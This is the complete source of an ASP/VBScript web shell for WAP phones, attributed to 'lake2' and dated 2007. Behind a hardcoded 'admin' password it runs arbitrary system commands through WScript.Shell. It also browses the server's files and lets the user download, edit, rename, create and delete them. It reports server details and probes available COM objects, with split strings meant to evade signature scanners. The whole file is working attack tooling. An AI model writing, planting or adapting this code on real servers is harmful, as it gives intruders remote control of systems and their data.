<%@ LANGUAGE="VBSCRIPT" CODEPAGE="65001"%>
<%Response.ContentType = "text/vnd.wap.wml"%>
<%
'------      Config  Start     ----------
PASSWORD = "admin"
SESSIONNAME = "wapadmin"
tPATH = request.ServerVariables("URL")
Server.ScriptTimeout = 600
'------      Config   End      ----------
%>
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE wml PUBLIC "-//WAPFORUM//DTD WML 1.1//EN" "http://www.wapforum.org/DTD/wml_1.1.xml">

<!--
WebShell for WAP 0.1 beta
Author: lake2 (lake2@mail.csdn.net)
Date:   2007-2-06
-->
<wml>
<template>
	<do type="accept" label="Main" name="tmp">
		<go href="<%=tPATH%>" method="post">
			<postfield name="fun" value=""/>
		</go>
	</do>
</template>
<%
If Request.Form("pwd") <> "" Then
	If Request.Form("pwd") = PASSWORD Then Session(SESSIONNAME) = 1
End If
If Session(SESSIONNAME) <> 1 Then
%>
 	<card id="login" title="Login - WebShell for WAP" newcontext="true">
	<p>
	password:<input name="pass" type="password"/>
	<do type="accept" label="login">
		<go href="<%=tPATH%>" method="post">
			<postfield name="pwd" value="$pass"/>
		</go>
	</do><br/>
	&nbsp;&nbsp;&nbsp;&nbsp;by&nbsp;lake2
	</p>
	</card>
<%
Else
	Select Case request("fun")
	Case ""
%>
 	<card id="main" title="Welcome">
	<p>Choose Function<br/>
	<select title="function" multiple="false" name="fun">
		<option title="cmd" value="cmd"></option>
		<option title="file" value="file"></option>
		<option title="info" value="info"></option>
		<option title="check" value="chk"></option>
		<option title="exit" value="exit"></option>
	</select>
	<do type="accept" label="go">
		<go href="<%=tPATH%>" method="post">
			<postfield name="fun" value="$fun"/>
		</go>
	</do><br/>
	</p>
	</card>

<%
	Case "cmd"
		If request("path") <> "" and request("arg") <> "" Then
			set kk=CreateObject("WScript.Shell")
			str=kk.eXec(request("path") & " " & request("arg")).stdout.readall
			str=replace(str,"<","&lt;")
			str=replace(str,">","&gt;")
			str=replace(str,vbcrlf,"<br/>")
		End If
%>
 	<card id="cmd" title="Command">
	<p>
	Path:<input name="xpath" value="cmd.exe"/><br/>
	Arg :<input name="arg" value="/c ver"/><br/>
	<do type="accept" label="Exec">
		<go href="<%=tPATH%>" method="post">
			<postfield name="path" value="$xpath"/>
			<postfield name="arg" value="$arg"/>
			<postfield name="fun" value="cmd"/>
		</go>
	</do><br/>
	<%=str%>
	</p>
	</card>
<%
	Case "file"
		path=request("path")
		if path="" then path="."
		if path="." then path=server.mappath(".")
		if path="\" then path=server.mappath("\")
		if right(path,1)<>"\" then path=path&"\"
%>
 	<card id="file" title="File Manager" newcontext="true">
	<p>
	Path:<input name="path" value="<%=path%>"/>
	<do type="accept" label="go">
		<go href="<%=tPATH%>" method="post">
			<postfield name="path" value="$path"/>
			<postfield name="fun" value="file"/>
		</go>
	</do><br/>
	<anchor>Create<go href="<%=tPATH%>" method="post"><postfield name="path" value="<%=path%>"/><postfield name="fun" value="fileop"/><postfield name="op" value="new"/></go></anchor><br/>
<%
	Set FSO = CreateObject("Scripting.FileSystemObject")
	Set f = FSO.GetFolder(Path)
%>
	<anchor>&lt;..&gt;<go href="<%=tPATH%>" method="post"><postfield name="path" value="<%=getParentPath(path)%>"/><postfield name="fun" value="file"/></go></anchor><br/>
<%
	Set fc = f.SubFolders
	For Each f1 in fc
%>
	<anchor>&lt;<%=f1.name%>&gt;<go href="#folderop"><setvar name="xpath" value="<%=path&f1.name&"\"%>"/></go></anchor><br/>
<%
    Next
	Set fc2 = f.files
	For Each myfile in fc2
%>
	<anchor><%=myfile.name%><go href="#fileop"><setvar name="xpath" value="<%=path&myfile.name%>"/></go></anchor>&nbsp;&nbsp;<%=myfile.Size%><br/>
<%
	Next
	Set FSO = Nothing
%>
	</p>
	</card>
	
	<card id="fileop" title="File Manager">
	<p>File Operation :<br/>
		<select title="operation" multiple="false" name="op">
			<option title="Down" value="down"/>
			<option title="Edit" value="edit"/>
			<option title="Rename" value="re"/>
			<option title="Del" value="del"/>
		</select><br/>
		<do type="accept" label="Do">
			<go href="<%=tPATH%>" method="post">
				<postfield name="fun" value="fileop"/>
				<postfield name="op" value="$op"/>
				<postfield name="path" value="$xpath"/>
			</go>
		</do><br/>
  <do type="accept" label="Back" name="t2">
    <go href="#file"/>
  </do>
	</p>
	</card>
	
	<card id="folderop" title="Folder Manager">
	<p>File Operation :<br/>
		<select title="operation" multiple="false" name="op">
			<option title="Rename" value="re"/>
			<option title="Open" value="open" onpick="<%="http://"&request.ServerVariables("SERVER_NAME")&tPATH%>?fun=file&amp;path=$xpath"/>
			<option title="Del" value="del"/>
		</select><br/>
		<do type="accept" label="Do">
			<go href="<%=tPATH%>" method="post">
				<postfield name="fun" value="fileop"/>
				<postfield name="op" value="$op"/>
				<postfield name="path" value="$xpath"/>
			</go>
		</do><br/>
  <do type="accept" label="Back" name="t2">
    <go href="#file"/>
  </do>
	</p>
	</card>
<%
	Case "fileop"
		thepath=request("path")
		Select Case request("op")
			Case "new"
%>
				<card id="new" title="Create">
				<p>Name:<input name="filename"/><br/>
					<select title="type" multiple="false" name="type">
						<option title="Folder" value="d"/>
						<option title="File" value="f"/>
					</select><br/>
					<do type="accept" label="Create">
						<go href="<%=tPATH%>" method="post">
							<postfield name="fun" value="fileop"/>
							<postfield name="op" value="new2"/>
							<postfield name="path" value="<%=thepath%>"/>
							<postfield name="filename" value="$filename"/>
							<postfield name="type" value="$type"/>
						</go>
					</do><br/>
					  <do type="accept" label="Back" name="t2">
						<prev/>
					  </do>
					</p>
				</card>
<%
			Case "new2"
				tmp=thePath&"\"&request("filename")
				Set fso=CreateObject("Scripting.FileSystemObject")
				if request("type")="d" then
					fso.CreateFolder(tmp)
				else
					fso.CreateTextFile tmp,False
				End if
				set fso =nothing
%>
				<card id="news" title="Good">
				<p>Create Success !<br/>
					<do type="accept" label="Go">
						<go href="<%=tPATH%>" method="post">
							<postfield name="fun" value="file"/>
							<postfield name="path" value="<%=thepath%>"/>
						</go>
					</do><br/>
				</p>
				</card>
<%
			Case "down"
				Response.Clear
				Set xstream = server.createObject("ADODB.Stream")
				xstream.open
				xstream.type=1
				xstream.loadFromFile(thePath)
				fileName = split(thePath,"\")(uBound(split(thePath,"\")))
				response.addHeader "Content-Disposition", "attachment; filename=" & filename
				response.addHeader "Content-Length",xstream.Size
				response.charset = "UTF-8"
				response.contentType = "application/octet-stream"
				response.binaryWrite(xstream.read)
				response.flush
				xstream.close
				xstream=nothing
				response.End()
			Case "edit"
				Set FSOx = CreateObject("Scripting.FileSystemObject")
				Set theFile = fsoX.OpenTextFile(thePath, 1)
				tmp = theFile.ReadAll()
				theFile.Close
				Set theFile = Nothing
%>
				<card id="edit1" title="Edit">
				<p><input name="text" value="<%=replace(replace(replace(replace(tmp,"<","&lt;"),">","&gt;")," ","&nbsp;"),"""","&quot;")%>"/><br/>
					<do type="accept" label="Edit">
						<go href="<%=tPATH%>" method="post">
							<postfield name="fun" value="fileop"/>
							<postfield name="op" value="edit2"/>
							<postfield name="path" value="<%=thepath%>"/>
							<postfield name="fc" value="$text"/>
						</go>
					</do><br/>
				</p>
				</card>
<%
			Case "edit2"
				Set FSOx = CreateObject("Scripting.FileSystemObject")
				Set theFile = fsoX.OpenTextFile(thePath, 2, True)
				theFile.Write(request("fc"))
				theFile.Close
				Set theFile = Nothing
%>
				<card id="edits" title="Good">
				<p>Edit Success !<br/>
					<do type="accept" label="Go">
						<go href="<%=tPATH%>" method="post">
							<postfield name="fun" value="file"/>
							<postfield name="path" value="<%=getParentPath(thepath)%>"/>
						</go>
					</do><br/>
				</p>
				</card>
<%
			Case "re"
				thepath2=thepath
				if right(thePath,1)="\" then thePath=left(thePath,len(thePath)-1)
%>
				<card id="rename" title="Rename">
				<p><input name="name" value="<%=right(thepath,len(thepath)-instrrev(thepath,"\"))%>"/><br/>
					<do type="accept" label="Go">
						<go href="<%=tPATH%>" method="post">
							<postfield name="fun" value="fileop"/>
							<postfield name="op" value="re2"/>
							<postfield name="name" value="$name"/>
							<postfield name="path" value="<%=thepath2%>"/>
						</go>
					</do><br/>
				</p>
				</card>
<%
			Case "re2"
				Set fso=CreateObject("Scripting.FileSystemObject")
				if right(thePath,1)="\" then 
					thePath=left(thePath,Len(thePath)-1)
					Set theF=fso.GetFolder(thePath)
				else
					Set theF=fso.GetFile(thePath)
				end if
					theF.Name=request("name")
					Set theF=Nothing
%>
				<card id="renames" title="Good">
				<p>Rename Success !<br/>
					<do type="accept" label="Go">
						<go href="<%=tPATH%>" method="post">
							<postfield name="fun" value="file"/>
							<postfield name="path" value="<%=getParentPath(thepath)%>"/>
						</go>
					</do><br/>
				</p>
				</card>
<%
			Case "del"
				Set FSOX=CreateObject("Scripting.FileSystemObject")
				if right(thePath,1)="\" then
					thePath=left(thePath,Len(thePath)-1)
					fsoX.DeleteFolder thePath, True
				else
					fsoX.DeleteFile thePath, True
				end if
				Set fsox = nothing
%>
				<card id="dels" title="Good">
				<p>Delete Success !<br/>
					<do type="accept" label="Go">
						<go href="<%=tPATH%>" method="post">
							<postfield name="fun" value="file"/>
							<postfield name="path" value="<%=getParentPath(thepath)%>"/>
						</go>
					</do><br/>
				</p>
				</card>
<%
		End Select
%>
<%
	Case "info"
%>
 	<card id="info" title="Infomation">
	<p>
	<table align="L" columns="2">
	<tr><td>Server IP</td><td><%=request.ServerVariables("LOCAL_ADDR")%></td></tr>
	<tr><td>Server Port</td><td><%=request.ServerVariables("SERVER_PORT")%></td></tr>
	<tr><td>Software</td><td><%=request.ServerVariables("SERVER_SOFTWARE")%></td></tr>
	<tr><td>Path</td><td><%=request.ServerVariables("PATH_TRANSLATED")%></td></tr>
	<tr><td>Your IP</td><td><%=request.ServerVariables("REMOTE_ADDR")%></td></tr>
	<tr><td>Your Agent</td><td><%=request.ServerVariables("HTTP_USER_AGENT")%></td></tr>
	<tr><td>Now</td><td><%=now%></td></tr>
	</table>
	</p>
	</card>
<%
	Case "chk"
%>
 	<card id="check" title="Checker">
	<p><table align="L" columns="2">
<%
		Dim aObj(8)
		aObj(0) = "Scripting.FileSystemObject"
		aObj(1) = "Adodb.Stream"
		aObj(2) = "Shel" & anti & "l.App" & anti & "lication"
		aObj(3) = "WScr" & anti & "ipt.Shell"
		aObj(4) = "WScript.Network"
		aObj(5) = "ADOX.Catalog"
		aObj(6) = "JMail.SmtpMail"
		aObj(7) = "Microso" & anti & "ft.XMLHTTP"
		aObj(8) = "Msxml2.ServerXMLHTTP"
		On Error Resume Next
		For Each x In aObj
			Set objTmp = Server.CreateObject(x)
			If Err <> -2147221005 Then
				IsSupport = "√"
			Else
				IsSupport = "×"
			End If
			Err.Clear
%>
	<tr><td><%=x%></td><td><%=IsSupport%></td></tr>
<%
		Next
%>
	</table>
	</p>
	</card>

<%
	Case "exit"
		Session.Abandon()
%>
 	<card id="bye" title="Bye">
	<p>byebye, good boy :)
	</p>
	</card>
<%
	Case else
%>
 	<card id="no" title="Error">
	<p>anyone is here ?
	</p>
	</card>
<%
	End Select


Function getParentPath(strPath)
	tmpPath=strPath
	If Right(strPath, 1) = "\" Then
		tmpPath = Left(tmpPath, Len(tmpPath) - 1)
	End If
	If Len(strPath) < 4 Then
		getParentPath = tmpPath & "\"
	Else
		getParentPath = Left(tmpPath, InStrRev(tmpPath, "\"))
	End If
End Function
%>
<%End If%>
</wml> 
